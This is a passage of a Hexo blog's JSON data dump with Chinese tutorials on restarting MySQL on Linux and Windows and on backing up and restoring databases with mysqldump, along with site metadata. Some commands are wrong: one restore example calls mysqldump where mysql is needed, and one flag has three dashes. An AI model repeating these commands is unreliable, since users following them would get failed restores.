3、以上方法都无效的时候，可以通过强行命令：“killall mysql”来关闭MySQL，但是不建议用这样的方式，因为这种野蛮的方法会强行终止MySQL数据库服务，有可能导致表损坏</p>\n<p>使用这个命令后，输入mysql的结果可能呈现为</p>\n<p>ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’</p>\n<p>使用下面方法启动就行</p>\n<p>　　步骤或方法:RedHat Linux (Fedora Core/Cent OS)</p>\n<p>　　1.启动：/etc/init.d/mysqld start</p>\n<p>　　2.停止：/etc/init.d/mysqld stop</p>\n<p>　　3.重启：/etc/init.d/mysqld restart</p>\n<p>　　Debian / Ubuntu Linux</p>\n<p>　　1.启动：/etc/init.d/mysql start</p>\n<p>　　2.停止：/etc/init.d/mysql stop</p>\n<p>　　3.重启：/etc/init.d/mysql restart</p>\n<h4 id=\"Windows下重启MySQL的正确方法：\"><a href=\"#Windows下重启MySQL的正确方法：\" class=\"headerlink\" title=\"　　Windows下重启MySQL的正确方法：\"></a>　　Windows下重启MySQL的正确方法：</h4><p>　　1.点击“开始”-&gt;“运行”(快捷键Win+R)。</p>\n<p>　　2.启动：输入 net start mysql</p>\n<p>　　3.停止：输入 net stop mysql</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"在kali上使用mysql时遇到的一些情况\"><a href=\"#在kali上使用mysql时遇到的一些情况\" class=\"headerlink\" title=\"在kali上使用mysql时遇到的一些情况\"></a>在kali上使用mysql时遇到的一些情况</h1><h3 id=\"如何重启MySQL，正确启动MySQL\"><a href=\"#如何重启MySQL，正确启动MySQL\" class=\"headerlink\" title=\"如何重启MySQL，正确启动MySQL\"></a>如何重启MySQL，正确启动MySQL</h3><p>linux平台及windows平台mysql重启方法</p>\n<h4 id=\"Linux下重启MySQL的正确方法：\"><a href=\"#Linux下重启MySQL的正确方法：\" class=\"headerlink\" title=\"　　Linux下重启MySQL的正确方法：\"></a>　　Linux下重启MySQL的正确方法：</h4><p>　　1、通过rpm包安装的MySQL</p>\n<pre><code>　service mysqld restart</code></pre><p>　　2、从源码包安装的MySQL</p>\n<p>　　// linux关闭MySQL的命令</p>\n<pre><code>$mysql_dir/bin/mysqladmin -uroot -p shutdown</code></pre><p>　　// linux启动MySQL的命令</p>\n<pre><code>$mysql_dir/bin/mysqld_safe &amp;</code></pre><p>　　其中mysql_dir为MySQL的安装目录，mysqladmin和mysqld_safe位于MySQL安装目录的bin目录下，很容易找到的。</p>\n<p>　　3、以上方法都无效的时候，可以通过强行命令：“killall mysql”来关闭MySQL，但是不建议用这样的方式，因为这种野蛮的方法会强行终止MySQL数据库服务，有可能导致表损坏</p>\n<p>使用这个命令后，输入mysql的结果可能呈现为</p>\n<p>ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’</p>\n<p>使用下面方法启动就行</p>\n<p>　　步骤或方法:RedHat Linux (Fedora Core/Cent OS)</p>\n<p>　　1.启动：/etc/init.d/mysqld start</p>\n<p>　　2.停止：/etc/init.d/mysqld stop</p>\n<p>　　3.重启：/etc/init.d/mysqld restart</p>\n<p>　　Debian / Ubuntu Linux</p>\n<p>　　1.启动：/etc/init.d/mysql start</p>\n<p>　　2.停止：/etc/init.d/mysql stop</p>\n<p>　　3.重启：/etc/init.d/mysql restart</p>\n<h4 id=\"Windows下重启MySQL的正确方法：\"><a href=\"#Windows下重启MySQL的正确方法：\" class=\"headerlink\" title=\"　　Windows下重启MySQL的正确方法：\"></a>　　Windows下重启MySQL的正确方法：</h4><p>　　1.点击“开始”-&gt;“运行”(快捷键Win+R)。</p>\n<p>　　2.启动：输入 net start mysql</p>\n<p>　　3.停止：输入 net stop mysql</p>\n"},{"layout":"post","title":"MySQL数据库备份与还原","date":"2020-11-17T16:00:00.000Z","description":"一个有用小知识","typora-copy-images-to":"..\\img","_content":"\n\n\n# MySQL数据库备份与还原\n\n\n\n```\n数据库文件默认在：cd /usr/share/mysql\n配置文件默认在：/etc/my.cnf\n\n数据库目录：/var/lib/mysql/\n配置文件：/usr/share/mysql(mysql.server命令及配置文件)\n相关命令：/usr/bin(mysqladmin、mysqldump等命令)(*mysql的一种安全启动方式：/usr/bin/mysqld_safe –user=root &)\n启动脚本：/etc/rc.d/init.d/\n```\n\n你可以使用以下的命令来寻找MySQL：\n\n```\n[root@stuhome /]# find / -name “mysql” -print\n或\nwhereis mysql\n```\n\n\n\n一般来说mysql是放在/usr/local/mysql/下的。\n然后在其bin目录下有个mysql_config文件，vim，会看见这么一句：\n\n```\nldata=’/usr/local/mysql/var’\n```\n\n \n\nrpm安装默认目录：\n\n```\n数据文件：/var/lib/mysql/\n配置文件模板：/usr/share/mysql\nmysql客户端工具目录：/usr/bin\n日志目录：/var/log/\npid，sock文件目录：/tmp/\n```\n\n\n\n## **备份数据库和还原MySQL**\n\n备份和还原MySQL数据库的步骤：\n\n### **如何使用CLI备份数据库**\n\n使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。\n```\nmysqldump -u[uname] -p[pass] [dbname] > [backupfile].sql\n```\n- [uname] - 是有权访问数据库的用户的名称；\n- [pass] - 用户密码；\n- [dbname] - 是要备份或导出的数据库的名称；\n- [backupfile] - 是备份文件的名称。\n\n提供一个示例数据库配置，比如要将linuxidc这个数据库导出为一个文件名为linuxidc-back.sql的数据库文件到当前目录下，则输入下面的命令：\n\n[liloong@localhost ~/www.linuxidc.com]$mysqldump -uroot -proot mysql > mysql-back.sql\n\n用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql\n\n需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。\n\n### **如何使用CLI还原数据库**\n\n恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。\n```\nmysql -u[uname] -p[pass] [dbname] < [backupfile].sql\n```\n- [uname] - 是有权访问数据库的用户名；\n- [pass] - 用户密码；\n- [dbname] - 是要还原或导入的数据库的名称；\n- [backupfile] - 是还原文件的名称。\n\n给出一个数据库还原示例，如下所示：\n\n[linuxidc@localhost ~/www.linuxidc.com]$mysqldump -uroot -pv linuxidc < linuxidc-back.sql\n\n![备份和还原MySQL数据库的简便方法](https://www.linuxidc.com/upload/2020_03/20030313493957.png)\n\n### **其他命令参考:**\n\n备份远程MySQL数据库的命令\n```\nmysqldump -h[hostname] -u[username] -p[password] [databasename] > backupfile.sql\n```\n备份MySQL数据库为带删除表的格式备份MySQL数据库为带删除表的格式，能够让该备份覆盖已有数据库而不需要手动删除原有数据库。\n```\nmysqldump ---add-drop-table -u[username] -p[password] [databasename] > backupfile.sql\n```\n（远程）直接将MySQL数据库压缩备份\n```\nmysqldump -h[hostname] -u[username] -p[password] [databasename] | gzip > backupfile.sql.gz\n```\n（远程）备份MySQL数据库某个(些)表\n```\nmysqldump -h[hostname] -u[username] -p[password] [databasename] [table1 table2] > backupfile.sql\n```\n（远程）同时备份多个MySQL数据库\n```\nmysqldump -h[hostname] -u[username] -p[password] --databases [databasename1 databasename2 databasename3] > multibackupfile.sql\n```\n仅仅备份数据库结构\n```\nmysqldump -u[username] -p[password] --no-data --databases [databasename1 databasename2 databasename3] > structurebackupfile.sql\n```\n备份服务器上所有数据库\n```\nmysqldump -u[username] -p[password] --all-databases > allbackupfile.sql\n```\n（远程）还原MySQL数据库的命令\n```\nmysql -h[hostname] -u[username] -p[password] [databasename] < backupfile.sql\n```\n还原压缩的MySQL数据库\n```\ngunzip < backupfile.sql.gz | mysql -u[username] -p[password] [databasename]\n```\n\n\n\n### 简单粗暴的方法\n\n**备份，直接复制整个数据库目录**\n\n　　MySQL有一种非常简单的备份方法，就是将MySQL中的数据库文件直接复制出来。这是最简单，速度最快的方法。\n\n不过在此之前，要先将服务器停止，这样才可以保证在复制期间数据库的数据不会发生变化。如果在复制数据库的过程中还有数据写入，就会造成数据不一致。这种情况在开发环境可以，但是在生产环境中很难允许备份服务器。\n\n　　注意：这种方法不适用于InnoDB存储引擎的表，而对于MyISAM存储引擎的表很方便。同时，还原时MySQL的版本最好相同。\n\n**还原，直接替换复制目录的备份**\n\n 　　通过这种方式还原时，必须保证两个MySQL数据库的版本号是相同的。MyISAM类型的表有效，对于InnoDB类型的表不可用，InnoDB表的表空间不能直接复制。","source":"_posts/2020-11-18-数据库备份与还原.md","raw":"---\nlayout: post\ntitle: MySQL数据库备份与还原\ndate: 2020-11-18\ncategories: blog\ntags: [web,数据库]\ndescription: 一个有用小知识\ntypora-copy-images-to: ..\\img\n---\n\n\n\n# MySQL数据库备份与还原\n\n\n\n```\n数据库文件默认在：cd /usr/share/mysql\n配置文件默认在：/etc/my.cnf\n\n数据库目录：/var/lib/mysql/\n配置文件：/usr/share/mysql(mysql.server命令及配置文件)\n相关命令：/usr/bin(mysqladmin、mysqldump等命令)(*mysql的一种安全启动方式：/usr/bin/mysqld_safe –user=root &)\n启动脚本：/etc/rc.d/init.d/\n```\n\n你可以使用以下的命令来寻找MySQL：\n\n```\n[root@stuhome /]# find / -name “mysql” -print\n或\nwhereis mysql\n```\n\n\n\n一般来说mysql是放在/usr/local/mysql/下的。\n然后在其bin目录下有个mysql_config文件，vim，会看见这么一句：\n\n```\nldata=’/usr/local/mysql/var’\n```\n\n \n\nrpm安装默认目录：\n\n```\n数据文件：/var/lib/mysql/\n配置文件模板：/usr/share/mysql\nmysql客户端工具目录：/usr/bin\n日志目录：/var/log/\npid，sock文件目录：/tmp/\n```\n\n\n\n## **备份数据库和还原MySQL**\n\n备份和还原MySQL数据库的步骤：\n\n### **如何使用CLI备份数据库**\n\n使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。\n```\nmysqldump -u[uname] -p[pass] [dbname] > [backupfile].sql\n```\n- [uname] - 是有权访问数据库的用户的名称；\n- [pass] - 用户密码；\n- [dbname] - 是要备份或导出的数据库的名称；\n- [backupfile] - 是备份文件的名称。\n\n提供一个示例数据库配置，比如要将linuxidc这个数据库导出为一个文件名为linuxidc-back.sql的数据库文件到当前目录下，则输入下面的命令：\n\n[liloong@localhost ~/www.linuxidc.com]$mysqldump -uroot -proot mysql > mysql-back.sql\n\n用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql\n\n需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。\n\n### **如何使用CLI还原数据库**\n\n恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。\n```\nmysql -u[uname] -p[pass] [dbname] < [backupfile].sql\n```\n- [uname] - 是有权访问数据库的用户名；\n- [pass] - 用户密码；\n- [dbname] - 是要还原或导入的数据库的名称；\n- [backupfile] - 是还原文件的名称。\n\n给出一个数据库还原示例，如下所示：\n\n[linuxidc@localhost ~/www.linuxidc.com]$mysqldump -uroot -pv linuxidc < linuxidc-back.sql\n\n![备份和还原MySQL数据库的简便方法](https://www.linuxidc.com/upload/2020_03/20030313493957.png)\n\n### **其他命令参考:**\n\n备份远程MySQL数据库的命令\n```\nmysqldump -h[hostname] -u[username] -p[password] [databasename] > backupfile.sql\n```\n备份MySQL数据库为带删除表的格式备份MySQL数据库为带删除表的格式，能够让该备份覆盖已有数据库而不需要手动删除原有数据库。\n```\nmysqldump ---add-drop-table -u[username] -p[password] [databasename] > backupfile.sql\n```\n（远程）直接将MySQL数据库压缩备份\n```\nmysqldump -h[hostname] -u[username] -p[password] [databasename] | gzip > backupfile.sql.gz\n```\n（远程）备份MySQL数据库某个(些)表\n```\nmysqldump -h[hostname] -u[username] -p[password] [databasename] [table1 table2] > backupfile.sql\n```\n（远程）同时备份多个MySQL数据库\n```\nmysqldump -h[hostname] -u[username] -p[password] --databases [databasename1 databasename2 databasename3] > multibackupfile.sql\n```\n仅仅备份数据库结构\n```\nmysqldump -u[username] -p[password] --no-data --databases [databasename1 databasename2 databasename3] > structurebackupfile.sql\n```\n备份服务器上所有数据库\n```\nmysqldump -u[username] -p[password] --all-databases > allbackupfile.sql\n```\n（远程）还原MySQL数据库的命令\n```\nmysql -h[hostname] -u[username] -p[password] [databasename] < backupfile.sql\n```\n还原压缩的MySQL数据库\n```\ngunzip < backupfile.sql.gz | mysql -u[username] -p[password] [databasename]\n```\n\n\n\n### 简单粗暴的方法\n\n**备份，直接复制整个数据库目录**\n\n　　MySQL有一种非常简单的备份方法，就是将MySQL中的数据库文件直接复制出来。这是最简单，速度最快的方法。\n\n不过在此之前，要先将服务器停止，这样才可以保证在复制期间数据库的数据不会发生变化。如果在复制数据库的过程中还有数据写入，就会造成数据不一致。这种情况在开发环境可以，但是在生产环境中很难允许备份服务器。\n\n　　注意：这种方法不适用于InnoDB存储引擎的表，而对于MyISAM存储引擎的表很方便。同时，还原时MySQL的版本最好相同。\n\n**还原，直接替换复制目录的备份**\n\n 　　通过这种方式还原时，必须保证两个MySQL数据库的版本号是相同的。MyISAM类型的表有效，对于InnoDB类型的表不可用，InnoDB表的表空间不能直接复制。","slug":"2020-11-18-数据库备份与还原","published":1,"updated":"2020-11-19T02:54:00.830Z","comments":1,"photos":[],"link":"","_id":"ckkntx9js0010xov7l1ay4ke2","content":"<h1 id=\"MySQL数据库备份与还原\"><a href=\"#MySQL数据库备份与还原\" class=\"headerlink\" title=\"MySQL数据库备份与还原\"></a>MySQL数据库备份与还原</h1><pre><code>数据库文件默认在：cd /usr/share/mysql\n配置文件默认在：/etc/my.cnf\n\n数据库目录：/var/lib/mysql/\n配置文件：/usr/share/mysql(mysql.server命令及配置文件)\n相关命令：/usr/bin(mysqladmin、mysqldump等命令)(*mysql的一种安全启动方式：/usr/bin/mysqld_safe –user=root &amp;)\n启动脚本：/etc/rc.d/init.d/</code></pre><p>你可以使用以下的命令来寻找MySQL：</p>\n<pre><code>[root@stuhome /]# find / -name “mysql” -print\n或\nwhereis mysql</code></pre><p>一般来说mysql是放在/usr/local/mysql/下的。<br>然后在其bin目录下有个mysql_config文件，vim，会看见这么一句：</p>\n<pre><code>ldata=’/usr/local/mysql/var’</code></pre><p>rpm安装默认目录：</p>\n<pre><code>数据文件：/var/lib/mysql/\n配置文件模板：/usr/share/mysql\nmysql客户端工具目录：/usr/bin\n日志目录：/var/log/\npid，sock文件目录：/tmp/</code></pre><h2 id=\"备份数据库和还原MySQL\"><a href=\"#备份数据库和还原MySQL\" class=\"headerlink\" title=\"备份数据库和还原MySQL\"></a><strong>备份数据库和还原MySQL</strong></h2><p>备份和还原MySQL数据库的步骤：</p>\n<h3 id=\"如何使用CLI备份数据库\"><a href=\"#如何使用CLI备份数据库\" class=\"headerlink\" title=\"如何使用CLI备份数据库\"></a><strong>如何使用CLI备份数据库</strong></h3><p>使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。</p>\n<pre><code>mysqldump -u[uname] -p[pass] [dbname] &gt; [backupfile].sql</code></pre><ul>\n<li>[uname] - 是有权访问数据库的用户的名称；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要备份或导出的数据库的名称；</li>\n<li>[backupfile] - 是备份文件的名称。</li>\n</ul>\n<p>提供一个示例数据库配置，比如要将linuxidc这个数据库导出为一个文件名为linuxidc-back.sql的数据库文件到当前目录下，则输入下面的命令：</p>\n<p>[liloong@localhost ~/<a href=\"http://www.linuxidc.com]$mysqldump\" target=\"_blank\" rel=\"noopener\">www.linuxidc.com]$mysqldump</a> -uroot -proot mysql &gt; mysql-back.sql</p>\n<p>用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql</p>\n<p>需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。</p>\n<h3 id=\"如何使用CLI还原数据库\"><a href=\"#如何使用CLI还原数据库\" class=\"headerlink\" title=\"如何使用CLI还原数据库\"></a><strong>如何使用CLI还原数据库</strong></h3><p>恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。</p>\n<pre><code>mysql -u[uname] -p[pass] [dbname] &lt; [backupfile].sql</code></pre><ul>\n<li>[uname] - 是有权访问数据库的用户名；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要还原或导入的数据库的名称；</li>\n<li>[backupfile] - 是还原文件的名称。</li>\n</ul>\n<p>给出一个数据库还原示例，如下所示：</p>\n<p>[linuxidc@localhost ~/<a href=\"http://www.linuxidc.com]$mysqldump\" target=\"_blank\" rel=\"noopener\">www.linuxidc.com]$mysqldump</a> -uroot -pv linuxidc &lt; linuxidc-back.sql</p>\n<p><img src=\"https://www.linuxidc.com/upload/2020_03/20030313493957.png\" alt=\"备份和还原MySQL数据库的简便方法\"></p>\n<h3 id=\"其他命令参考\"><a href=\"#其他命令参考\" class=\"headerlink\" title=\"其他命令参考:\"></a><strong>其他命令参考:</strong></h3><p>备份远程MySQL数据库的命令</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] &gt; backupfile.sql</code></pre><p>备份MySQL数据库为带删除表的格式备份MySQL数据库为带删除表的格式，能够让该备份覆盖已有数据库而不需要手动删除原有数据库。</p>\n<pre><code>mysqldump ---add-drop-table -u[username] -p[password] [databasename] &gt; backupfile.sql</code></pre><p>（远程）直接将MySQL数据库压缩备份</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] | gzip &gt; backupfile.sql.gz</code></pre><p>（远程）备份MySQL数据库某个(些)表</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] [table1 table2] &gt; backupfile.sql</code></pre><p>（远程）同时备份多个MySQL数据库</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] --databases [databasename1 databasename2 databasename3] &gt; multibackupfile.sql</code></pre><p>仅仅备份数据库结构</p>\n<pre><code>mysqldump -u[username] -p[password] --no-data --databases [databasename1 databasename2 databasename3] &gt; structurebackupfile.sql</code></pre><p>备份服务器上所有数据库</p>\n<pre><code>mysqldump -u[username] -p[password] --all-databases &gt; allbackupfile.sql</code></pre><p>（远程）还原MySQL数据库的命令</p>\n<pre><code>mysql -h[hostname] -u[username] -p[password] [databasename] &lt; backupfile.sql</code></pre><p>还原压缩的MySQL数据库</p>\n<pre><code>gunzip &lt; backupfile.sql.gz | mysql -u[username] -p[password] [databasename]</code></pre><h3 id=\"简单粗暴的方法\"><a href=\"#简单粗暴的方法\" class=\"headerlink\" title=\"简单粗暴的方法\"></a>简单粗暴的方法</h3><p><strong>备份，直接复制整个数据库目录</strong></p>\n<p>　　MySQL有一种非常简单的备份方法，就是将MySQL中的数据库文件直接复制出来。这是最简单，速度最快的方法。</p>\n<p>不过在此之前，要先将服务器停止，这样才可以保证在复制期间数据库的数据不会发生变化。如果在复制数据库的过程中还有数据写入，就会造成数据不一致。这种情况在开发环境可以，但是在生产环境中很难允许备份服务器。</p>\n<p>　　注意：这种方法不适用于InnoDB存储引擎的表，而对于MyISAM存储引擎的表很方便。同时，还原时MySQL的版本最好相同。</p>\n<p><strong>还原，直接替换复制目录的备份</strong></p>\n<p> 　　通过这种方式还原时，必须保证两个MySQL数据库的版本号是相同的。MyISAM类型的表有效，对于InnoDB类型的表不可用，InnoDB表的表空间不能直接复制。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"MySQL数据库备份与还原\"><a href=\"#MySQL数据库备份与还原\" class=\"headerlink\" title=\"MySQL数据库备份与还原\"></a>MySQL数据库备份与还原</h1><pre><code>数据库文件默认在：cd /usr/share/mysql\n配置文件默认在：/etc/my.cnf\n\n数据库目录：/var/lib/mysql/\n配置文件：/usr/share/mysql(mysql.server命令及配置文件)\n相关命令：/usr/bin(mysqladmin、mysqldump等命令)(*mysql的一种安全启动方式：/usr/bin/mysqld_safe –user=root &amp;)\n启动脚本：/etc/rc.d/init.d/</code></pre><p>你可以使用以下的命令来寻找MySQL：</p>\n<pre><code>[root@stuhome /]# find / -name “mysql” -print\n或\nwhereis mysql</code></pre><p>一般来说mysql是放在/usr/local/mysql/下的。<br>然后在其bin目录下有个mysql_config文件，vim，会看见这么一句：</p>\n<pre><code>ldata=’/usr/local/mysql/var’</code></pre><p>rpm安装默认目录：</p>\n<pre><code>数据文件：/var/lib/mysql/\n配置文件模板：/usr/share/mysql\nmysql客户端工具目录：/usr/bin\n日志目录：/var/log/\npid，sock文件目录：/tmp/</code></pre><h2 id=\"备份数据库和还原MySQL\"><a href=\"#备份数据库和还原MySQL\" class=\"headerlink\" title=\"备份数据库和还原MySQL\"></a><strong>备份数据库和还原MySQL</strong></h2><p>备份和还原MySQL数据库的步骤：</p>\n<h3 id=\"如何使用CLI备份数据库\"><a href=\"#如何使用CLI备份数据库\" class=\"headerlink\" title=\"如何使用CLI备份数据库\"></a><strong>如何使用CLI备份数据库</strong></h3><p>使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。</p>\n<pre><code>mysqldump -u[uname] -p[pass] [dbname] &gt; [backupfile].sql</code></pre><ul>\n<li>[uname] - 是有权访问数据库的用户的名称；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要备份或导出的数据库的名称；</li>\n<li>[backupfile] - 是备份文件的名称。</li>\n</ul>\n<p>提供一个示例数据库配置，比如要将linuxidc这个数据库导出为一个文件名为linuxidc-back.sql的数据库文件到当前目录下，则输入下面的命令：</p>\n<p>[liloong@localhost ~/<a href=\"http://www.linuxidc.com]$mysqldump\" target=\"_blank\" rel=\"noopener\">www.linuxidc.com]$mysqldump</a> -uroot -proot mysql &gt; mysql-back.sql</p>\n<p>用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql</p>\n<p>需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。</p>\n<h3 id=\"如何使用CLI还原数据库\"><a href=\"#如何使用CLI还原数据库\" class=\"headerlink\" title=\"如何使用CLI还原数据库\"></a><strong>如何使用CLI还原数据库</strong></h3><p>恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。</p>\n<pre><code>mysql -u[uname] -p[pass] [dbname] &lt; [backupfile].sql</code></pre><ul>\n<li>[uname] - 是有权访问数据库的用户名；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要还原或导入的数据库的名称；</li>\n<li>[backupfile] - 是还原文件的名称。</li>\n</ul>\n<p>给出一个数据库还原示例，如下所示：</p>\n<p>[linuxidc@localhost ~/<a href=\"http://www.linuxidc.com]$mysqldump\" target=\"_blank\" rel=\"noopener\">www.linuxidc.com]$mysqldump</a> -uroot -pv linuxidc &lt; linuxidc-back.sql</p>\n<p><img src=\"https://www.linuxidc.com/upload/2020_03/20030313493957.png\" alt=\"备份和还原MySQL数据库的简便方法\"></p>\n<h3 id=\"其他命令参考\"><a 